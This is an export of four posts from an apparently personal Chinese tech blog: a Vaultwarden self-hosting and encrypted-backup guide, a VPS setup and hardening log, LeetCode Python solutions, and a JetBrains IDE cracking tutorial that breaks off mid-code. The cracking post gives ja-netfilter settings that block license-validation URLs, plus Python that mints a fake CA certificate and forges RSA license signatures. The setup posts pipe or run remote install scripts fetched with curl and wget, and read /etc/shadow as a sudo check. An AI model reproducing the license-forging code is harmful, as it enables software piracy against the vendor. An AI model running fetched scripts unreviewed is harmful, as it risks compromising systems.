[{"content":"前言 新买服务器，密码很多，保存密码，为了安全，防止被打，备份保底。\n前置步骤 自行安装1panel面板，并开启https和面板的安全配置，如防火墙、fail2ban等。或者根据配置的流程自己摸索单独配置。\n安装Vaultwarden 我用的docker-composes.yaml\n1 2 3 4 5 6 7 8 9 10 11 services: vaultwarden: image: vaultwarden/server:latest container_name: vaultwarden restart: unless-stopped environment: ADMIN_TOKEN: \u0026#34;xxxxxxxxxxxxxx\u0026#34; DOMAIN: \u0026#34;https://vw.3306.fun\u0026#34; volumes: - ./vw-data/:/data/ network_mode: bridge 这里的ADMIN_TOKEN很重要，相当于后台唯一的管理密码，虽然配置里写明文，用于第一次登录（我不会说因为直接在容器里配置没成功），后面在管理面板再更改。\n之后创建站点反向代理容器的地址，以及开启https。\n设置waf和限制 在1panel的高级功能-WAF-网站设置，找到创建的站点，然后设置访问频率\n然后在Cloudflare WAF中创建一个速率限制\n添加自定义规则设置：\n规则。阻止其他国家的访问，不想限制所有域名可以添加域名限制，我的表达式为(http.host wildcard \u0026quot;example.com\u0026quot; and ip.src.country ne \u0026quot;CN\u0026quot;)\n配置DNS记录，添加记录并开启小黄云（已代理）。\n找到 SSL/TLS 概述，选择配置，自定义 SSL/TLS，选择完全（严格）。\n登录配置 访问 https://example.com/ 创建账户。然后访问后台地址/admin输入创建docker时的ADMIN_TOKEN登陆，之后关键步骤：\n将Domain URL设置为自己的网站。 Client IP header设置为“cf**-**connecting-ip”，保证只有Cloudflare访问 Admin token/Argon2 PHC 选项设置为新的ADMIN_TOKEN admin后台限制 因为admin页面权限过大，平时也用不到，所以可以在1panel中配置路径重定向到127.0.0.1，需要更改配置的时候关掉重定向，修改关闭再打开。\n其他配置 在Vaultwarden开启两步验证等，自行摸索。\n同步配置 Rclone：用于将备份文件上传到 OneDrive。 GPG：用于加密备份文件。 Cron：用于定时执行备份和更新脚本。 安装rclone\n1 curl https://rclone.org/install.sh | sudo bash 验证安装成功\n1 rclone version https://linux.do/t/topic/238502\n根据帖子配置网盘：https://linux.do/t/topic/481620。最后代码修改为如下，后台挂载。\n1 rclone mount onedrive:/backup/ /mnt/onedrive --allow-non-empty --vfs-cache-mode full --daemon 配置开机自动挂载。\n方法1：编辑 ~/.config/autostart/rclone-onedrive.desktop 添加以下内容 1 2 3 4 5 6 [Desktop Entry] Type=Application Name=Mount OneDrive with rclone Exec=rclone mount onedrive:/backup/ /mnt/onedrive --allow-non-empty --vfs-cache-mode full --daemon writes \u0026amp; Terminal=false Hidden=false 方法2：直接把挂载命令写成一个 sh 脚本文件，在 crontab 中添加配置每次开机后自动执行。 1 @reboot /path/to/rclone-onedrive.sh 自动备份 采用 sqlite3 先热备数据库，然后打包。备份计划每天一个日备份，保存在daily文件夹下，保留30份，循环覆写。每个月一个月备份，保存在monthly文件夹下，保留12份，循环覆写。注意安装依赖环境\n1 apt-get install sqlite3 脚本文件如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #!/bin/bash # 定义路径 # 数据地址 DATA_DIR=\u0026#34;/vw-data\u0026#34; # 网盘挂载的地址 BACKUP_DIR=\u0026#34;/mnt/onedrive\u0026#34; DAILY_BACKUP_DIR=\u0026#34;${BACKUP_DIR}/daily\u0026#34; MONTHLY_BACKUP_DIR=\u0026#34;${BACKUP_DIR}/monthly\u0026#34; WORK_DIR=\u0026#34;${BACKUP_DIR}/work\u0026#34; DATE=$(date +%Y%m%d) DAILY_BACKUP_RETENTION=30 MONTHLY_BACKUP_RETENTION=12 # 定义加密密码 GPG_PASSPHRASE=\u0026#34;your_secret_passphrase_here\u0026#34; # 你的加密密码 # 确保目标目录存在 mkdir -p \u0026#34;$DAILY_BACKUP_DIR\u0026#34; \u0026#34;$MONTHLY_BACKUP_DIR\u0026#34; \u0026#34;$WORK_DIR\u0026#34; # Step 1: 执行SQLite3热备份 sqlite3 \u0026#34;${DATA_DIR}/db.sqlite3\u0026#34; \u0026#34;.backup \u0026#39;${WORK_DIR}/db_${DATE}.sqlite3\u0026#39;\u0026#34; # Step 2: 打包备份文件 tar -czf \u0026#34;${WORK_DIR}/backup_${DATE}.tar.gz\u0026#34; -C \u0026#34;${WORK_DIR}\u0026#34; \u0026#34;db_${DATE}.sqlite3\u0026#34; # Step 3: 加密备份文件 echo \u0026#34;$GPG_PASSPHRASE\u0026#34; | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 --output \u0026#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg\u0026#34; \u0026#34;${WORK_DIR}/backup_${DATE}.tar.gz\u0026#34; # Step 4: 删除临时文件 rm \u0026#34;${WORK_DIR}/db_${DATE}.sqlite3\u0026#34; \u0026#34;${WORK_DIR}/backup_${DATE}.tar.gz\u0026#34; # Step 5: 每月备份逻辑（每月第一天执行） if [ \u0026#34;$(date +%d)\u0026#34; -eq 1 ]; then cp \u0026#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg\u0026#34; \u0026#34;${MONTHLY_BACKUP_DIR}/\u0026#34; fi # Step 6: 保留最近的30份每日备份 cd \u0026#34;${DAILY_BACKUP_DIR}\u0026#34; ls -tp | grep -v \u0026#39;/$\u0026#39; | tail -n +$((${DAILY_BACKUP_RETENTION}+1)) | xargs -I {} rm -- {} # Step 7: 保留最近12个月的备份 cd \u0026#34;${MONTHLY_BACKUP_DIR}\u0026#34; ls -tp | grep -v \u0026#39;/$\u0026#39; | tail -n +$((${MONTHLY_BACKUP_RETENTION}+1)) | xargs -I {} rm -- {} 修改脚本权限\n1 chmod 700 /path/to/backup.sh 创建定时任务每天凌晨 2 点自动备份。使用crontab @reboot，记得加+x权限\n1 0 2 * * * /path/to/backup.sh 可以手动运行一次脚本，检查云盘中是否有备份文件，同时重启一下服务器查看网盘是否自动挂载。\n恢复备份 可以同样用管道符传入密码。（不推荐，安全问题） 1 echo \u0026#34;$GPG_PASSPHRASE\u0026#34; | gpg --batch --yes --passphrase-fd 0 --decrypt --output \u0026#34;${WORK_DIR}/backup_${DATE}.tar.gz\u0026#34; \u0026#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg\u0026#34; 交互式输入密码，执行命令后会弹窗输出密码。（推荐） 1 gpg --decrypt --output \u0026#34;${WORK_DIR}/backup_${DATE}.tar.gz\u0026#34; \u0026#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg\u0026#34; ","date":"2025-04-13T00:00:00Z","permalink":"https://www.braindance.top/articles/2025/04/vaultwarden-build/","title":"自建Vaultwarden并备份同步"},{"content":"前言 快毕业了忙的飞起，上个服务器到期了我都没来得及管，现在写这篇博客还是在github的pages上，又接触了一些项目，想买个便宜好使的服务器玩玩。\n在论坛里搜到ClawCloud评价不错，刚好最近有活动优惠就入手了一台系统为Debian，之前一直用的ubuntu，这下也换个玩玩。记录一下机器怎么样和自己配置过程，也边以后自己看。\n2C / 2G / 40G / 1T $25.20 USD 测评 部分测试结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 VPS融合怪版本：2025.02.12 Shell项目地址：https://github.com/spiritLHLS/ecs Go项目地址：https://github.com/oneclickvirt/ecs ---------------------基础信息查询--感谢所有开源项目--------------------- CPU 型号 : Intel(R) Xeon(R) Platinum CPU 核心数 : 2 CPU 频率 : 2500.002 MHz CPU 缓存 : L1: 32.00 KB / L2: 1.00 MB / L3: 33.00 MB AES-NI指令集 : ✔ Enabled VM-x/AMD-V支持 : ❌ Disabled 内存 : 130.84 MiB / 1.85 GiB Swap : [ no swap partition or swap file detected ] 硬盘空间 : 911.28 MiB / 40110.19 MiB 启动盘路径 : /dev/vda1 系统在线时间 : 0 days, 0 hour 5 min 负载 : 1.02, 0.34, 0.12 系统 : Debian GNU/Linux 12 (bookworm) (x86_64) 架构 : x86_64 (64 Bit) 内核 : 6.1.0-31-cloud-amd64 TCP加速方式 : cubic 虚拟化架构 : KVM NAT类型 : Full Cone IPV4 ASN : AS45102 Alibaba (US) Technology Co., Ltd. IPV4 位置 : Tokyo / Tokyo / JP IPV6 ASN : AS45102 Alibaba IPV6 位置 : Tokyo / Tokyo / Japan IPV6 子网掩码 : 128 ----------------------CPU测试--通过sysbench测试------------------------- -\u0026gt; CPU 测试中 (Fast Mode, 1-Pass @ 5sec) 1 线程测试(单核)得分: 1062 Scores 2 线程测试(多核)得分: 1770 Scores ---------------------内存测试--感谢lemonbench开源----------------------- -\u0026gt; 内存测试 Test (Fast Mode, 1-Pass @ 5sec) 单线程读测试:\t5350.57 MB/s 单线程写测试:\t5815.83 MB/s ------------------磁盘dd读写测试--感谢lemonbench开源-------------------- -\u0026gt; 磁盘IO测试中 (4K Block/1M Block, Direct Mode) 测试操作\t写速度\t读速度 100MB-4K Block\t35.0 MB/s (8551 IOPS, 2.99s)\t52.4 MB/s (12800 IOPS, 2.00s) 1GB-1M Block\t232 MB/s (221 IOPS, 4.52s)\t208 MB/s (198 IOPS, 5.04s) ---------------------磁盘fio读写测试--感谢yabs开源---------------------- Block Size | 4k (IOPS) | 64k (IOPS) ------ | --- ---- | ---- ---- Read | 20.68 MB/s (5.1k) | 96.31 MB/s (1.5k) Write | 20.69 MB/s (5.1k) | 96.82 MB/s (1.5k) Total | 41.37 MB/s (10.3k) | 193.13 MB/s (3.0k) | | Block Size | 512k (IOPS) | 1m (IOPS) ------ | --- ---- | ---- ---- Read | 91.97 MB/s (179) | 91.36 MB/s (89) Write | 96.85 MB/s (189) | 97.44 MB/s (95) Total | 188.82 MB/s (368) | 188.81 MB/s (184) 完整测试结果连接如下：\nhttps://paste.spiritlhl.net/#/show/WG2vI.txt\nhttp://hpaste.spiritlhl.net/#/show/WG2vI.txt\n咱也看不懂，也没有什么特殊需求，就部署点项目，下载包方便。\n配置 更新组件、包管理 1 2 sudo apt update #这个命令会更新软件包列表，让系统知道有哪些软件包可以更新。 sudo apt upgrade --only-upgrade #这个命令会安装所有可用的软件包更新。 BBR BBR 是 Google 提出的一种新型拥塞控制算法（Bottleneck Bandwidth and RTT），全称为瓶颈带宽和往返传播时间。\n在 Linux 系统中，BBR 主要有以下特点和作用：\n提高网络性能：它可以显著提高吞吐量和降低 TCP 连接的延迟，使数据传输更加高效。 适应不同网络环境：适合高延迟、高带宽的网络链路，以及慢速接入网络的用户，能在一定丢包率的网络链路上充分利用带宽，并降低网络链路上的缓冲区占用率从而降低延迟。 优化拥塞控制：BBR 改变了传统基于丢包反馈的拥塞控制机制，通过精确测量往返传播时间（RTT）和瓶颈带宽等参数来更有效地控制数据发送速率，避免了传统算法中因单纯丢包判断拥塞而导致的带宽利用率不高和端到端延迟大等问题。 提升网络稳定性：有助于减少网络拥塞和数据包丢失，提高网络的稳定性和可靠性。 运行代码\n1 wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh \u0026amp;\u0026amp; chmod +x bbr.sh \u0026amp;\u0026amp; ./bbr.sh 重启 VPS、使内核更新和BBR设置都生效\n1 sudo reboot 确认bbr是否开启\n1 lsmod | grep bbr 结果为\n1 tcp_bbr 20480 1 添加SAWP 注意到测评结果里没有SAWP。在虚拟专用服务器（VPS）中，SWAP 是当物理内存（RAM）已被占满时用于存储数据的磁盘空间。它充当 RAM 的溢出区，允许系统将不活跃的内存页移动到 SWAP 空间，从而为活跃进程释放 RAM。这在处理占用大量内存的应用程序或同时运行多个应用程序时特别有用。然而，访问 SWAP 空间的速度比访问 RAM 慢，因为它涉及磁盘 I/O 操作。因此，虽然 SWAP 可以帮助避免内存不足错误，但应适当配置以确保 VPS 的最佳性能。\n使用脚本添加\n1 wget -O swap.sh https://raw.githubusercontent.com/yuju520/Script/main/swap.sh \u0026amp;\u0026amp; chmod +x swap.sh \u0026amp;\u0026amp; clear \u0026amp;\u0026amp; ./swap.sh 注意输入SWAP的大小为单位M\n查看当前内存\n1 free -m 添加用户 修改root密码，创建新用户，加入sudo列表； 关闭root账户登陆，普通用户开启免密登录，并关闭密码登录； 1 2 3 4 sudo adduser xiaoming sudo passwd xiaoming echo \u0026#39;xiaoming ALL=(ALL) ALL\u0026#39; | sudo tee /etc/sudoers.d/xiaoming 验证\n1 2 su xiaoming sudo cat /etc/shadow 如果能够成功执行命令，说明 sudo 权限已正确添加\n1 ssh-keygen -t rsa 然后添加公钥内容到服务器/home/user/.ssh/authorized_keys中。\n建议登录验证一下！！！再关闭密码登录\n关闭root登录、用户密码登录 修改/etc/ssh/sshd_config 1 2 PermitRootLogin no # 禁用root登录 PasswordAuthentication no #禁用用户密码登录 如果不生效了注意一下sshd_config.d目录下的内容。重启ssh。\n1 service ssh restart 重启不生效就reboot\n修改ssh端口 修改/etc/ssh/sshd_config 1 #Port 22 安装Docker 1 2 3 # 安装Docker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 安装ufw 1、更新软件包\n1 sudo apt update 2、安装 UFW\n1 sudo apt install ufw 3、如果你在远程位置连接你的服务器，在启用 UFW 防火墙之前，你必须显式允许进来的 SSH 连接。否则，你将永远都无法连接到机器上。\n1 sudo ufw allow 22/tcp 如果 SSH 运行在非标准端口，你需要将上述命令中的 22 端口替换为对应的 SSH 端口。\n5、启动 UFW\n1 sudo ufw enable fail2ban 1、安装 Fail2ban\n1 sudo apt-get install fail2ban 2、Debian 12 及以上的版本需要手动安装 rsyslog\n1 sudo apt-get install rsyslog 3、启动 Fail2ban 服务\n1 sudo systemctl start fail2ban 4、开机自启动\n1 sudo systemctl enable fail2ban 5、查看 Fail2ban 服务状态。\n1 sudo systemctl status fail2ban 评价 好使的一。官网也有测试的探针，我这是东京的比香港的好使点。终端的体验感觉也比rn的好多了。如果可以的话就传家宝了。\n","date":"2025-03-05T00:00:00Z","permalink":"https://www.braindance.top/articles/2025/03/clawcloud%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/","title":"ClawCloud使用体验"},{"content":" 1 2 3 4 关键：题目中关键信息 题解：自己或别人的解题思路 特解：这道题使用特殊方法 Get：学到的点 2869. 收集元素的最少操作次数 题解：从数组末端开始，标记数组，只有小于K的去求余标记，然后求和查一下是不是全1。全1返回结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution(object): def minOperations(self, nums, k): \u0026#34;\u0026#34;\u0026#34; :type nums: List[int] :type k: int :rtype: int \u0026#34;\u0026#34;\u0026#34; flag = [0] * k for i in range(len(nums)-1, -1, -1): if nums[i]\u0026lt;=k: flag[nums[i]%k] = 1 if sum(flag) == k: return len(nums)-i 题解：创建k的集合从集合里删除数字，为空返回。\n2974. 最小数字游戏 关键：bob先加入arr，Alice后加。为什么要刻意强调数组是偶数长度？\n特解：排序后两两交换大的在前。\n1 2 3 4 5 6 7 8 9 10 class Solution(object): def numberGame(self, nums): \u0026#34;\u0026#34;\u0026#34; :type nums: List[int] :rtype: List[int] \u0026#34;\u0026#34;\u0026#34; nums.sort() for i in range(0, len(nums), 2): nums[i], nums[i + 1] = nums[i + 1], nums[i] return nums Get：pop时候从后往前删，不然会越界。\n1103. 分糖果 II 题解：等差序列为1求序列和公式，对糖果数量 candies 求解并向下取整，得到的是每次增加一个可以分给几个小朋友 n（有剩余，因为使用的是取整），然后生成一个 1 到 n 的等差序列数组，数组最后加上剩余的糖果。遍历序列下标，下标对 num_people 求余加到最终答案数组里。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution(object): def distributeCandies(self, candies, num_people): \u0026#34;\u0026#34;\u0026#34; :type candies: int :type num_people: int :rtype: List[int] \u0026#34;\u0026#34;\u0026#34; import math pre_check = math.floor((((-1) + (math.sqrt(1 + 8 * candies))) / 2)) leaf_candy = int(candies - (pre_check * (pre_check + 1) / 2)) series = [i for i in range(1,int(pre_check+1))] series = series + [leaf_candy] if leaf_candy \u0026gt; 0 else series res = [0] * num_people for i in range(0, len(series)): res[i % num_people] = res[i % num_people] + series[i] return res 944. 删列造序 题解：获取 strs 长度 l 代表一列的字符串长度，l_str 是有几列。然后相邻两个比较大小（python直接比价ASCII值）如果发生前面比后面大就说明不是严格递增。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution(object): def minDeletionSize(self, strs): \u0026#34;\u0026#34;\u0026#34; :type strs: List[str] :rtype: int \u0026#34;\u0026#34;\u0026#34; l = len(strs) l_str = len(strs[0]) res = 0 for i in range(l_str): for j in range(l-1): if strs[j][i] \u0026gt; strs[j+1][i]: res += 1 break return res 3142. 判断矩阵是否满足条件 题解：判断所有竖列相同，任选一行判断横向相邻不相同。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution(object): def satisfiesConditions(self, grid): \u0026#34;\u0026#34;\u0026#34; :type grid: List[List[int]] :rtype: bool \u0026#34;\u0026#34;\u0026#34; for i in range(len(grid[0])-1): k = grid[0][i] if grid[0][i] == grid[0][i+1]: return False for j in range(len(grid)): if grid[j][i] != k: return False k = grid[0][len(grid[0])-1] for j in range(len(grid)): if grid[j][len(grid[0])-1] != k: return False return True 1450. 在既定时间做作业的学生人数 题解：要求 queryTime 处于 [startTime[i], endTime[i]] 之间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution(object): def busyStudent(self, startTime, endTime, queryTime): \u0026#34;\u0026#34;\u0026#34; :type startTime: List[int] :type endTime: List[int] :type queryTime: int :rtype: int \u0026#34;\u0026#34;\u0026#34; res = 0 for i in range(len(startTime)): if endTime[i] \u0026lt; queryTime: continue else: if startTime[i] \u0026lt;= queryTime: res += 1 return res 其他题解：用flag标记，开始时间值为1，结束时间值为-1，从开头截取数组到queryTime 即 flag[:queryTime + 1]求和就是结果。\nGet：有人在评论区问这样枚举 就可以了，其他方案都是来搞笑的，但是对于多次查询的话其他题解的方式就是一劳永逸。\n3153. 所有数对中数位差之和 题解：数字长度一样，按照个十百的顺序处理每一位，对最后一位取余使用 flag 统计个数，最后对 flag 数组计算每个元素乘它右边元素值加到 res 上（比如个位4出现两次，5出现三次，那么这5个数不管其他位，个位比较且不同次数至少为2*3=6次，只能乘右边是避免重复）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution(object): def sumDigitDifferences(self, nums): \u0026#34;\u0026#34;\u0026#34; :type nums: List[int] :rtype: int \u0026#34;\u0026#34;\u0026#34; len_num = len(str(nums[0])) res = 0 for i in range(len_num): flag = [0]*10 for j in nums: flag[(j // 10**i) % 10] += 1 # print(flag) for m in range(10): if flag[m] \u0026gt; 0: for n in range(m+1, 10): if flag[n] \u0026gt; 0: res += flag[m]*flag[n] return res 官方题解差不多，它是都乘结果除以2。\n3127. 构造相同颜色的正方形 题解：遍历格子的右、右下、下。统计相同颜色超过3个就返回 True。\n1 2 3 4 5 6 7 8 9 10 11 12 13 for i in range(2): for j in range(2): flag = [] flag.append(grid[i][j]) flag.append(grid[i+1][j]) flag.append(grid[i][j+1]) flag.append(grid[i+1][j+1]) from collections import Counter cnt = Counter(flag) for value in cnt.values(): if value \u0026gt;= 3: return True return False 2024. 考试的最大困扰度 题解：就是判断最大连续的字符数，但是可以修改字符使其更长。使用滑动窗口。以 T 为例，left 和 right 记录最长的区间，sum 记录为 F 的区间长度。right 往右移，遇 T 不增加 F 增加 sum，如果 sum 大于 k，则左区间也往右移清零，ans 记录最大值答案。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution(object): def maxConsecutiveAnswers(self, answerKey, k): \u0026#34;\u0026#34;\u0026#34; :type answerKey: str :type k: int :rtype: int \u0026#34;\u0026#34;\u0026#34; def maxCont(ch): left,ans,sum=0,0,0 for right in range(len(answerKey)): sum += answerKey[right] != ch while sum \u0026gt; k: sum -= answerKey[left] != ch left += 1 ans = max(ans,right-left+1) return ans return max(maxCont(\u0026#39;T\u0026#39;),maxCont(\u0026#39;F\u0026#39;)) 同1004. 最大连续1的个数 III\n2708. 一个小组的最大实力值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 class Solution(object): def maxStrength(self, nums): \u0026#34;\u0026#34;\u0026#34; :type nums: List[int] :rtype: int \u0026#34;\u0026#34;\u0026#34; nums = sorted(nums) if len(nums) == 1: return nums[0] if len(nums) == 2: ans = nums[0] * nums[1] if ans \u0026lt;= 0: return max(nums) return ans pos_cnt, zero_cnt, neg_cnt = 0, 0, 0 ans = 1 max_nav = -10 for i in range(len(nums)): if nums[i] == 0: zero_cnt += 1 continue if nums[i] \u0026gt; 0: pos_cnt += 1 else: max_nav = max(max_nav, nums[i]) neg_cnt += 1 ans *= nums[i] if pos_cnt == 0: if neg_cnt == 1 or neg_cnt == 0: return 0 if ans \u0026lt; 0: ans = ans // max_nav return ans 题解：分类讨论，我要气晕了。感觉代码里我考虑情况重复了。\n仅有一个数，直接返回。 数组中小于等于1个负数，其他都是0，在 ans // max_nav 时要注意最大值是0。 其他情况，非零数全乘，如果值为正返回，如果值为负，除以最大的非零负数 max_nav就是答案。 ","date":"2024-09-02T00:00:00Z","permalink":"https://www.braindance.top/articles/2024/09/%E8%8F%9C%E9%B8%A1%E8%A7%A3%E9%A2%981/","title":"菜鸡解题1"},{"content":"突然想开发了我的 IDEA 还是 2021 的，IDEA 和 Pycharm 还在机械硬盘，装个最新的到固态里面。教育邮箱懒得申请了，失效了又要麻烦续杯。写出来记录一下以后自己参考。\n所提供的内容仅供学习交流使用,严禁用于商业用途,请于下载后24小时内删除。\n准备 破解使用的是 ja-netfilter：https://gitee.com/ja-netfilter/ja-netfilter。release 下载以后解压。\nconfig 配置文件默认为空，需要添加一些配置。plugins 是可以加载一些其他联动插件，本文使用的方法不用其他插件。\n找到 IDEA 或者 Pycharm 的 Help \u0026mdash;\u0026gt; Edit Custom VM Options 添加启动参数，路径是ja-netfilter的 jar 包路径。\n1 -javaagent:C:\\\\path\\\\to\\\\ja-netfilter.jar Jetbrain全家桶在2022.2版本以上默认启用Java17，所以用的时候需要在 VM Options 里额外增加下面两行参数。\n1 2 --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED 在这里修改的 VM Options 配置文件路径是 C 盘下的本版本全局配置，也可以修改添加到安装目录下的 bin 目录中的 idea64.exe.vmoptions 配置文件。\n修改其他配置 修改 config 修改文件夹下的\ncongig/url.conf\n1 2 3 [URL] PREFIX,https://account.jetbrains.com/lservice/rpc/validateKey.action PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action congig/dns.conf\n1 2 [DNS] EQUAL,jetbrains.com 激活 使用 power 插件 power 插件被作者成为非对称加密的屠龙刀，这种方式激活可以自定义信息，并且可以设置全家桶激活。\n参考大佬博客文章 本地运行两个 python 文件，一个用于生成本地证书签名文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import datetime from cryptography import x509 from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import hashes, serialization from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.x509.oid import NameOID one_day = datetime.timedelta(days=1) ten_day = datetime.timedelta(days=3650) today = datetime.datetime.today() yesterday = today - one_day tomorrow = today + ten_day private_key = rsa.generate_private_key( public_exponent=65537, key_size=4096, backend=default_backend() ) public_key = private_key.public_key() builder = x509.CertificateBuilder() builder = builder.subject_name(x509.Name([ x509.NameAttribute(NameOID.COMMON_NAME, \u0026#39;MoYuno-from-2022-07-25\u0026#39;), ])) builder = builder.issuer_name(x509.Name([ x509.NameAttribute(NameOID.COMMON_NAME, \u0026#39;JetProfile CA\u0026#39;), ])) builder = builder.not_valid_before(yesterday) builder = builder.not_valid_after(tomorrow) builder = builder.serial_number(x509.random_serial_number()) builder = builder.public_key(public_key) certificate = builder.sign( private_key=private_key, algorithm=hashes.SHA256(), backend=default_backend() ) private_bytes = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()) public_bytes = certificate.public_bytes( encoding=serialization.Encoding.PEM) with open(\u0026#34;ca.key\u0026#34;, \u0026#34;wb\u0026#34;) as fout: fout.write(private_bytes) with open(\u0026#34;ca.crt\u0026#34;, \u0026#34;wb\u0026#34;) as fout: fout.write(public_bytes) 还有一个生成 key 和伪造验签\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import base64 from Crypto.Hash import SHA1, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import pkcs1_15 from Crypto.Util.asn1 import DerSequence, DerObjectId, DerNull, DerOctetString from Crypto.Util.number import ceil_div from cryptography import x509 from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding # noinspection PyTypeChecker def pkcs15_encode(msg_hash, emLen, with_hash_parameters=True): \u0026#34;\u0026#34;\u0026#34; Implement the ``EMSA-PKCS1-V1_5-ENCODE`` function, as defined :param msg_hash: hash object :param emLen: int :param with_hash_parameters: bool :return: An ``emLen`` byte long string that encodes the hash. \u0026#34;\u0026#34;\u0026#34; digestAlgo = DerSequence([DerObjectId(msg_hash.oid).encode()]) if with_hash_parameters: digestAlgo.append(DerNull().encode()) digest = DerOctetString(msg_hash.digest()) digestInfo = DerSequence([ digestAlgo.encode(), digest.encode() ]).encode() # We need at least 11 bytes for the remaining data: 3 fixed bytes and # at least 8 bytes of padding). if emLen \u0026lt; len(digestInfo) + 11: raise TypeError(\u0026#34;Selected hash algorithm has a too long digest (%d bytes).\u0026#34; % len(digest)) PS = b\u0026#39;\\xFF\u0026#39; * (emLen - len(digestInfo) - 3) return b\u0026#39;\\x00\\x01\u0026#39; + PS + b\u0026#39;\\x00\u0026#39; + digestInfo certBase64 = \u0026#34;MIIFTDCCAzSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIyMDcyNTIzMTcwOVoXDTMyMDcyMzIzMTcwOVowHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDDx3gz77KvezmZJhwkF/10Q3vESk96tK6wJ00CSKkLybRDeQVOlHX3QAnPL7BjwCTzHqErsuyPuiZ6YTAVE/n7hLhIbh3lC+EBbxpa2hpIdIvUimr70iSrH9ZBWmnn5Fxy4r/r0tbxr34zpQzu4uWLiEqmOiDfRN+Zzj9FBaJ/gKsuhF7zNAbFHsClYntim5furDRITBra28nu0hfQIEBSHGPS2EKWTbKk2ifBLzMEDp99zIGEe/hrLpgBhdwGVD7VJsoeTXnvcgpt+91kiM918GWThO1L3eKU6W2mGZQv1bRyps7Fo61NElNWtJqqZ3KKyxJGyR1QpdOHd9flAesvYwb/lvc4uqYiKqwvvn+4iHPQlLtZDbzj0ICbKtVKSWgSprh0T5ZQGGNWXN4OMHtg9EuXvbagLshTEDkLKLzEBqSNpNmMmyzwyNO9/voQmHLjiWLdjVIYndjl15G+A9Dw5mVYqzKPMLEpHzg6ldkKJkGAxNBhCMUsmbEypT6r7wsdTvgEwFnP8ToOsAb12lSLxoR2bOT3xJ3WIfbyjvlBnauXfdu6SFF/82QFrLtQyddPvCHEiJTI0NmSYhjQObFohXMVVoXjGbXvuqgJNbc5UK06pCGQ2jKw4j6k1kw2g4fEYBd1fvEzb1/t+izpP8dEI0365xh0C1dpQjUj3uyRywIDAQABo4GZMIGWMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwCQYDVR0TBAIwADATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwHQYDVR0OBBYEFCTaESKW9YVBwJNH6DEjTPTAhAL/MA0GCSqGSIb3DQEBCwUAA4ICAQA29wUDKatiQe1S0qfId+1dRWnYznrHE0Cx41HUaeI5hvdZrFbDIP6syb/S9oAXST6w4pfgh80jk1xVL+B7NT5kFC+AI7mpd8dK8Z+K67tagYg41TdLGfSHqK+lljln5ElqUEN21fba5CVZplE286jy973XFOFbWZUpJC/5onCCAh8pK8AqpN7k3ovR6bfAga41UWdTnGeiyw9+XOj30ryebseTKaDfjQxsxEmyuA8YYCu9lgb58cvVrvc99So8KdOBaxHnxeEfiUqvPA8Y0QG7lc5elZYQ6cbiIqqsb/k9XSgB2Gk4CjuacBSxCAfd06NlJvZSDFSR1HTKhQfPLIQY1OpBC+NrKRWnQT4/IORL6F36gI9lTK+ioX8mzQ2bvXn4sXA3jrpRnGM2WemQvMPvstfSDKfcUdKjwX3rZ2jMwREkx/thtF3Huvsc8suOyzto1faD8mV0m4guq85fb4c9ki6cinz3QM2k6otVvh67gK116RZ7I8P/urTWvK7IOdwOE7UVqtpEe6TKvNhr1rzeaxUMdPcD0kY7fhBpuPwEQA+Xk0uiVR+XbpaPD4HWuapJm+31jC7zBp/BamRI25v26P5qMUQF/+P7eE4Ah/X0Rtf2Qvr2+p9kbfqalT8EiqOsvRiTvlMG1hdo33JdcwsxC05BWvZ++7Af0FgJ3TtFlw==\u0026#34; cert = 